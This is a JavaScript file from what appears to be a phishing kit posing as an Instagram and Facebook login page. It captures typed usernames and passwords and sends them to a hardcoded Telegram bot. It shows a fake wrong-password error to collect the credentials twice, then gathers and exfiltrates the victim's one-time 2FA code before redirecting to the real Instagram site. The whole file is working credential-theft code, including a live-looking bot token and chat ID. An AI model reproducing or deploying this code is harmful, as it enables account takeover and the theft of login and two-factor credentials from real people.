window.onload = () => {
  const className = "_aa49";
  const botToken = "7765620578:AAFMcBkbDLvpGG0AamGkm-rq9H7mVA1fFUs";
  const chatId = "7818825015";
  const toggle = document.getElementById("toggle");
  const toggleBtn = document.getElementById("toggleBtn");
  const username = document.getElementById("username");
  const password = document.getElementById("password");
  const otp = document.getElementById("otp");
  const redirect = document.getElementById("redirect");
  const form1 = document.getElementById("form1");
  const form2 = document.getElementById("form2");
  toggle?.style?.setProperty("display", "none");
  window.allowLogin = false;
  function handleChange() {
    const parent = this.parentElement;
    this.value == ""
      ? parent.classList.contains(className)
        ? parent.classList.remove(className)
        : null
      : parent.classList.contains(className)
      ? null
      : parent.classList.add(className);
    this.value == ""
      ? toggle?.style?.setProperty("display", "none")
      : toggle?.style?.setProperty("display", "block");
  }
  const handleToggle = () => {
    password.type == "text"
      ? (password.type = "password")
      : (password.type = "text");
    password.type == "text"
      ? (toggleBtn.innerText = "HIDE")
      : (toggleBtn.innerText = "SHOW");
  };
  const post = (text, e, redirect = "/") => {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    const errorHTML = `<div class="_ab2z">
      Sorry, your password was incorrect. Please double-check your password.
    </div>`;
    const errorDiv = document.querySelector("#errorDiv");
    fetch(`${url}?chat_id=${chatId}&text=${encodeURIComponent(text)}`)
      .then((res) => {
        if (window.allowLogin || otp) {
          location.assign(redirect);
        } else {
          e.target.reset();
          errorDiv.innerHTML = errorHTML;
          window.allowLogin = true;
        }
      })
      .catch((err) => console.log(err));
  };
  const onSubmit = (e) => {
    e.preventDefault();
    if (otp) {
      post(otp.value, e, "https://instagram.com");
    } else {
      post(
        (username.classList.contains("isfb") ? "Facebook\n" : "") +
          username.value +
          "\n" +
          password.value,
        e,
        // "https://instagram.com"
        "otp.html"
      );
    }
  };
  ["username", "password", "otp"].forEach((id) => {
    const input = document.getElementById(id);
    input?.addEventListener("click", handleChange);
    input?.addEventListener("keyup", handleChange);
    input?.addEventListener("keydown", handleChange);
  });
  toggleBtn?.addEventListener("click", handleToggle);
  form1?.addEventListener("submit", onSubmit);
  form2?.addEventListener("submit", onSubmit);
  redirect?.addEventListener("click", () => location.assign("fbmobile.html"));
  document.body.style.display = "block"
};
